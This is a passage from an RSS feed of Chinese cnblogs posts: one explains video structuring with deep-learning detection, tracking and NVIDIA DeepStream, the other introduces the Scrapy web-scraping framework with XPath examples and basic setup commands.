&lt;p&gt;&lt;span&gt;利用深度学习技术实时分析视频中有价值的内容，并输出结构化数据。相比数据库中每条结构化数据记录，视频、图片、音频等属于非结构化数据，计算机程序不能直接识别非结构化数据，因此需要先将这些数据转换成有结构格式，用于后续计算机程序分析。视频结构化最常见的流程为：目标检测、目标分类（属性识别）、目标跟踪、目标行为分析。最后的目标行为分析严格来讲不属于视频结构化的范畴，可以算作前面每个环节结果的应用。由于现实生产过程中，一个完整的应用系统总会存在“目标行为分析”这个过程（否则光得到基础数据不能加以利用），所以本篇文章将其包含进来。&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;目标检测&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;对单张图片中感兴趣的目标进行识别、定位，注意两点，一个是检测的对象是静态图片，二是不但需要识别目标的类别，还需要给出目标在原图片中的坐标值，通常以（left, top, width, height）的形式给出。注意目标检测仅仅给出目标大概位置坐标（一个矩形区域），它跟图像分割不同，后者定位更加具体，能够给出图片中单个目标的轮廓边界。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;目标分类（属性识别）&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;通常目标被检测出来之后，会进行二次（多次）推理，识别出目标更加具体的属性，比如小轿车的颜色、车牌子奥迪还是奔驰等等。对于人来讲，可以二次推理出人的性别、年龄、穿着、发型等等外貌属性。这个环节主要对检测出来的目标进行更加具体的属性识别。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;目标跟踪&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;前面两个环节操作的对象是静态单张图片，而视频有时序性，前后两帧中的目标有关联关系。目标跟踪就是为了将视频第N帧中的目标和第N+1帧中的同一目标关联起来，通常做法是给它们赋予同一个ID。经过目标跟踪环节后，理论情况下，一个目标从进入视频检测范围到离开，算法赋予该目标的ID固定不变。但是现实生产过程中，由于各种原因，比如目标被遮挡、目标漏检（第N帧检测到，第N+1帧没检测到）、跟踪算法自身准确性等等原因，系统并不能锁定视频中同一个目标的ID。目标ID不能锁定，会造成目标行为分析不准的问题，后面会提到。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;目标行为分析&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;视频中目标被跟踪到，赋予唯一ID之后，我们可以记录目标在视频检测范内的运动轨迹（二维坐标点集合），通过分析目标轨迹点数据，我们可以做很多应用。比如目标是否跨域指定区域、目标运动方向、目标运动速度、目标是否逗留（逗留时长）、目标是否密集等等。该应用多存在于安防、交通视频分析领域。&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;目标检测算法&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;常见基于深度学习神经网络的目标检测算法有3种，SSD、YOLO以及Faster-RCNN，具体请搜索网络，介绍文章非常多了。三者各有优劣，遵循一个原则：速度快的准确性不好，很多目标检测不准，很多小目标检测不到、容易漏检等；准确性好的速度不快，可能达不到实时检测的要求，或者需要更高的硬件条件。鱼和熊掌不可兼得，牺牲速度可以换来准确性。这三种常见目标检测算法，综合性比较好的是YOLO（现在已经是YOLO V3版本），准确性、小目标检测、检测速度上都可以接受。SSD速度快，我在RTX 2080 的GPU上，能够检测32路1080P高清实时流，但是YOLO V3勉强可以跑到16路。Faster-RCNN准确性更好，但是速度太慢，如果你有很好的GPU硬件支持，或者单台服务器要求检测视频路数比较少，可以采用Faster-RCNN。下图第一张是SSD算法效果，第二张是YOLO V3的算法效果，两者模型都是采用同样的数据集训练而成，可以很明显看到，后者比前者效果好很多（忽略图中速度值）。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/104032/201905/104032-20190508134808052-1456915404.png&quot; alt=&quot;&quot;/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/104032/201905/104032-20190508134822747-122016815.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;需要注意的是，不管是何种算法，它们的检测效果受数据集质量影响非常大，数据集数量不够、标注质量不高，都会严重影响最终检测结果。做深度学习应用型系统，数据集的重要性非常明显。&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;视频结构化处理流程框架&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;前面说到过，视频结构化包含多个环节，各个环节相连而成，形成一个Pipeline的结构。在实际生产过程中，我们还需要有视频流接入的环节，它负责接收视频流数据，由于网络接收到的视频数据是编码过后的格式，我们还需要解码的环节，将原始视频数据解码成一张张RGB格式的图片（这之前可能还需要颜色空间转换，将YUV格式转换成RGB），之后将单帧图片送给推理模型进行推理，返回推理结果。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;很明显，视频结构化是一个数据流式的处理过程，如果对GStreamer框架比较熟悉的人可能或想到，GStreamer非常适合做这件事情。这里是GStreamer的官网：&lt;a href=&quot;https://gstreamer.freedesktop.org/&quot;&gt;https://gstreamer.freedesktop.org/&lt;/a&gt;，跟FFmpeg类似，它主要用于音视频多媒体程序开发，但是两个侧重点不同，GStreamer中将多媒体处理流程中的每个环节都封装成单个的插件，每个插件负责不同的任务，比如有接收视频流的、有负责编解码的、有颜色空间转换的等等，这些常用插件都已经有现成非常成熟的，不需要自己开发。插件和插件之间通过某个协议进行连接，最终形成一个完整的Pipeline。目前来看，使用FFmpeg的人明显多余GStreamer。在我们这个应用场景中，GStreamer非常适合我们，Nvidia官方推出的智能视频分析SDK DeepStream也是基于GStreamer开发而成，Nvidia为我们准备好了现成的插件，有负责推理的，有负责目标跟踪的，还有负责图片叠加和显示的。我们在使用DeepStream的同时，也可以使用GStreamer中已有的其他插件，他们可以无缝集成，非常方便。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;这里必须要提一下，GStreamer是C语言开发的，而我们知道C语言并非面向对象，如果要用到面向对象的特性必须采取其他措施，GStreamer就是使用了GObject那一套东西，GObject又是什么呢？它是一套在C中使用面向对象编程的规范。如果已经非常熟悉主流面向对象语言的人，再去接收GObject这种编程风格，会要疯掉，反人类（我这样觉得）。下图是采用DeepStream SDK开发视频结构化的Pipeline，简单示意，并非真实生产中的结构：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/104032/201905/104032-20190508140040740-104884906.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;使用&lt;/span&gt;DeepStream &lt;span&gt;做视频结构化应用的好处&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;如果你用的推理硬件是Nvidia出的，比如Tesla系列显卡、Geforce系列显卡等等，那么使用DeepStream SDK的好处有：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;（1）内置推理加速插件nvinfer，注意普通深度学习模型（caffe、tensorflow等）在没有经过tensorRT加速之前，速度是上不来的。而DeepStream内置的nvinfer推理插件不断支持各种目标检测算法（SSD、YOLO、Faster-RCNN）以及各种深度学习框架模型（自由切换），内部还自带tensorRT INT8/FP16加速功能，不需要你做额外操作；&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;（2）内置目标跟踪插件nvtracker，目前DeepStream 3.0提供两种跟踪算法，一种基于IOU的，这种算法简单，但是快；另外一种KLT算法，准确但是相对来讲慢一些，而且由于这个算法是跑在CPU上，基于KLT的跟踪算法对CPU占用相对大一些；&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;（3）内置其他比较有用的插件，比如用于视频叠加（目标方框叠加到视频中）的nvosd、硬件加速解码插件nvdec_h264，专门采用GPU加速的解码插件，还有其他颜色转换的插件。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;（4）提供跟视频处理有关的各种元数据类型以及API，方便你扩展自己的元数据类型，元数据在GStreamer中是一个很重要的概念。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;使用DeepStream SDK的前提是要先掌握GStreamer的基本用法，否则就是抓瞎，前者其实就是后者的一堆插件集合，方便供你构建视频推理Pipeline。当然，你还需要一些CUDA编程的基础知识。&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;下面提供一个基于YOLO V3 16路1080P高清视频实时目标检测、跟踪、叠加、目标行为判断、结构化数据上报 应用系统截图（截取其中4路图像），由于某些原因，不再做过多的技术细节介绍了。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/104032/201905/104032-20190508135600448-1608717284.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

</description>
<pubDate>Wed, 08 May 2019 06:01:00 +0000</pubDate>
<dc:creator>周见智</dc:creator>
<og:description>视频结构化的定义 利用深度学习技术实时分析视频中有价值的内容，并输出结构化数据。相比数据库中每条结构化数据记录，视频、图片、音频等属于非结构化数据，计算机程序不能直接识别非结构化数据，因此需要先将这些</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/xiaozhi_5638/p/10831459.html</dc:identifier>
</item>
<item>
<title>scrapy爬虫框架介绍 - 流星划过天际</title>
<link>http://www.cnblogs.com/zhaowei520/p/10742618.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zhaowei520/p/10742618.html</guid>
<description>
&lt;h2&gt;一为什么选择scrapy&lt;/h2&gt;

&lt;p&gt;　　通过这一篇博客,我致力于对scrapy进行简单的介绍和简单的网页WEB数据抓取能力.Scrapy是一个健壮的web框架，用于从各种数据源抓取数据。&lt;/p&gt;
&lt;p&gt;　　作为一个普通的web用户，您经常会发现自己希望能够通过Excel之类的电子表格程序从正在浏览的网站上获取数据(参见第3章基本爬行)，以便在脱机或执行计算时访问这些数据。&lt;/p&gt;
&lt;p&gt;　　作为开发人员，您常常希望能够组合来自各种数据源的数据，但是您很清楚检索或提取这些数据源的复杂性。Scrapy可以帮助您完成简单和复杂的数据提取活动。&lt;/p&gt;

&lt;h3&gt;　　1.处理残缺的HTML&lt;/h3&gt;
&lt;p&gt;　　　　您可以直接从Scrapy使用Beautiful Soup或lxml，但是Scrapy提供了选择器——lxml之上的高级XPath(主要)接口。它能够有效地处理损坏的HTML代码和混乱的编码。&lt;/p&gt;

&lt;h3&gt;　　2.社区&lt;/h3&gt;
&lt;p&gt;　　　　拥有一个强大的社区,在stack overflow上面 &lt;a class=&quot;ulink&quot; href=&quot;http://stackoverflow.com/questions/tagged/scrapy&quot;&gt;http://stackoverflow.com/questions/tagged/scrapy&lt;/a&gt;,基本能够在几分钟内解决你提出的问题.更多的社区信息可以访问 &lt;a class=&quot;ulink&quot; href=&quot;http://scrapy.org/community/&quot;&gt;http://scrapy.org/community/&lt;/a&gt;.&lt;/p&gt;

&lt;h3&gt;　　3.由社区维护的组织良好的代码&lt;/h3&gt;
&lt;p&gt;　　　　scrapy是一个标准化的大妈格式和框架,您可以编写名为spider和pipeline的Python小模块，并且可以自动地从将来对引擎本身的任何改进中获益。所以,不管有谁加入你的团队,都不必经历理解自定义爬行器特性的学习曲线。&lt;/p&gt;


&lt;h2&gt;二.scrapy需要注意的事项&lt;/h2&gt;
&lt;p&gt;　　在某些情况下，不负责任的web抓取可能是恼人的，甚至是非法的。需要避免的两件最重要的事情是拒绝服务攻击(DoS)，比如行为和侵犯版权。&lt;/p&gt;

&lt;p&gt;　　一个典型的web爬虫程序可能每秒下载几十个页面。这是普通用户产生流量的十倍多。这可能会让网站所有者感到不安。使用节流将生成的流量减少到可接受的类似用户的级别。监控响应时间，如果您看到响应时间在增加，请减少爬行的强度。&lt;/p&gt;
&lt;p&gt;　　在版权方面，很明显，看看你浏览的每一个网站的版权公告，确保你明白什么是允许的，什么是不允许的。为网站管理员提供一种方法来表达他们希望被排除在您的爬虫之外，这是很好的。&lt;/p&gt;

&lt;h2&gt;三.理解HTML和XPATH&lt;/h2&gt;
&lt;p&gt;　　为了解析来自web页面的信息,你必须要理解更多关于它的框架.&lt;/p&gt;
&lt;h3&gt;　　1.HTML&lt;/h3&gt;
&lt;p&gt;　　让我们花一些时间来理解从用户在浏览器上键入URL:&lt;/p&gt;
&lt;p&gt;　　　　1.在浏览器上键入URL。URL的第一部分(域名，如gumtree.com)用于在web上找到合适的服务器，URL和其他数据(如cookie)形成一个请求，该请求被发送到该服务器。&lt;/p&gt;
&lt;p&gt;　　　　2.服务器通过向浏览器发送HTML页面进行响应。注意，服务器还可能返回其他格式，如XML或JSON，但目前我们主要关注HTML。&lt;/p&gt;
&lt;p&gt;　　　　3.HTML被转换成浏览器中的一个内部树表示:文档对象模型(Document Object Model, DOM)。&lt;/p&gt;
&lt;p&gt;　　　　4.根据一些布局规则，将内部表示呈现为您在屏幕上看到的可视表示。&lt;/p&gt;

&lt;h3&gt;　　2.XPath&lt;/h3&gt;
&lt;p&gt;　　使用XPath选择和过滤HTML元素.文档的层次结构以元素开始，您可以使用元素名称和斜杠来选择文档的元素。例如，以下是从http://example.com/页面返回的各种表达式:&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:python;gutter:true;&quot;&gt;
$x('/html')
  [ &amp;lt;html&amp;gt;...&amp;lt;/html&amp;gt; ]
$x('/html/body')
  [ &amp;lt;body&amp;gt;...&amp;lt;/body&amp;gt; ]
$x('/html/body/div')
  [ &amp;lt;div&amp;gt;...&amp;lt;/div&amp;gt; ]
$x('/html/body/div/h1')
  [ &amp;lt;h1&amp;gt;Example Domain&amp;lt;/h1&amp;gt; ]
$x('/html/body/div/p')
  [ &amp;lt;p&amp;gt;...&amp;lt;/p&amp;gt;, &amp;lt;p&amp;gt;...&amp;lt;/p&amp;gt; ]
$x('/html/body/div/p[1]')
  [ &amp;lt;p&amp;gt;...&amp;lt;/p&amp;gt; ]
$x('/html/body/div/p[2]')
  [ &amp;lt;p&amp;gt;...&amp;lt;/p&amp;gt; ]
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　您还可以选择属性。http://example.com/上唯一的属性是链接的href，您可以使用字符@访问该链接，如下所示:&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
$x(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;//a/@href&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
  [ href&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;http://www.iana.org/domains/example&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; ]
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;你也能够永选择器text():&lt;/p&gt;
&lt;div class=&quot;informalexample&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
$x(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;//a/text()&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
  [ &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;More information...&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; ]
&lt;/pre&gt;&lt;/div&gt;

&lt;/div&gt;

&lt;p&gt;&lt;br/&gt;　　实际上，您经常需要在XPath表达式中使用类。在这些情况下，您应该记住，由于一些称为CSS的样式元素，您经常会看到HTML元素在它们的class属性上声明多个类。&lt;/p&gt;
&lt;p&gt;　　这意味着，例如，在导航系统中，您将看到一些div的类属性设置为“link”，而另一些div的类属性设置为“link active”。后者是当前处于活动状态的链接，因此可用特殊颜色(通过CSS)显示或突出显示。&lt;/p&gt;
&lt;p&gt;　　在进行抓取时，您通常会对包含特定类的元素感兴趣，即前面示例中的“link”和“link active”。contains() XPath函数允许您选择包含某个类的所有元素。&lt;/p&gt;


&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
//table[@&lt;span&gt;class&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;infobox&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;]//img[1]/&lt;span&gt;@src
&lt;/span&gt;//div[starts-with(@&lt;span&gt;class&lt;/span&gt;,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;reflist&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)]//a/&lt;span&gt;@href
&lt;/span&gt;//*[text()=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;References&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;]/../following-sibling::div//a
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;　　如果它们的HTML以使XPath表达式无效的方式更改，我们将不得不返回爬行器并纠正它们。这通常不会花费很长时间，因为更改通常很小。然而，这肯定是我们宁愿避免的事情。一些简单的规则可以帮助我们降低您的表达式无效的几率:&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
//*[@id=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;myid&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;]/div/div/div[1]/div[2]/div/div[1]/div[1]/a/&lt;span&gt;img
&lt;/span&gt;//div[@&lt;span&gt;class&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;thumbnail&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;]/a/&lt;span&gt;img
&lt;/span&gt;//*[@id=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;more_info&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;]//&lt;span&gt;text()
&lt;/span&gt;//[@id=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;order-F4982322&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;]
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　尽管id是惟一的，但是上面的XPath表达式非常糟糕。还要记住，即使id是惟一的，您也会发现许多HTML文档并不是惟一的。&lt;/p&gt;

&lt;h2&gt;四.基础爬虫&lt;/h2&gt;

&lt;h3&gt;　　1.安装scrapy&lt;/h3&gt;
&lt;p&gt;　　　　　　scrapy是通过python语言作为基础的，所以在scrapy安装以前，是要先安装python的，这里我就不多说python的安装了，网上有很多教程。&lt;/p&gt;
&lt;p&gt;　　　　　　这里我是通过Anaconda进行python包的版本控制，这样非常的方便管理python的各种包依赖版本问题。&lt;/p&gt;
&lt;p&gt;　　　　　　当安装了Anaconda后，就可以安装scrapy，scrapy也是python的一个包，所以命令如下：&lt;span class=&quot;strong&quot;&gt;pip install scrapy安装。&lt;/span&gt;&lt;/p&gt;
&lt;h4&gt;&lt;span class=&quot;strong&quot;&gt;　　2.创建scrapy项目&lt;br/&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;&lt;span class=&quot;strong&quot;&gt;　　　　　　scrapy startproject 项目名(demo)&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;                               &lt;img src=&quot;https://img2018.cnblogs.com/blog/1657327/201905/1657327-20190508130707564-1506501863.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;h3&gt;　　3.简单爬取网页（http://jandan.net）为例&lt;/h3&gt;

&lt;p&gt;　　　　1.创建jiandanSpider，作为项目主要入口&lt;/p&gt;
&lt;p&gt;　　　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1657327/201905/1657327-20190508133725291-665562186.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;





&lt;p&gt; 　　　　2.item&lt;/p&gt;
&lt;p&gt;                   &lt;img src=&quot;https://img2018.cnblogs.com/blog/1657327/201905/1657327-20190508133753209-889154281.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　　　3.pipeline&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1657327/201905/1657327-20190508133819918-61191846.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt; 　　　　4.setting&lt;/p&gt;
&lt;p&gt;　　　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1657327/201905/1657327-20190508133902796-1221738443.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;



&lt;p&gt;　　　　5.测试&lt;/p&gt;
&lt;p&gt;　　　　进入项目目录cmd&lt;/p&gt;
&lt;p&gt;　　　　使用命令：scrapy crawl jiandan,可以再E盘看到我们抓取下来的图片：&lt;/p&gt;
&lt;p&gt;　　　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1657327/201905/1657327-20190508134048441-1553622589.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;




&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
</description>
<pubDate>Wed, 08 May 2019 05:41:00 +0000</pubDate>
<dc:creator>流星划过天际</dc:creator>
<og:description>scrapy爬虫框架介绍 一为什么选择scrapy 通过这一篇博客,我致力于对scrapy进行简单的介绍和简单的网页WEB数据抓取能力.Scrapy是一个健壮的web框架，用于从各种数据源抓取数据。</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/zhaowei520/p/10742618.html</dc:identifier>
</item>
</channel>
</rss>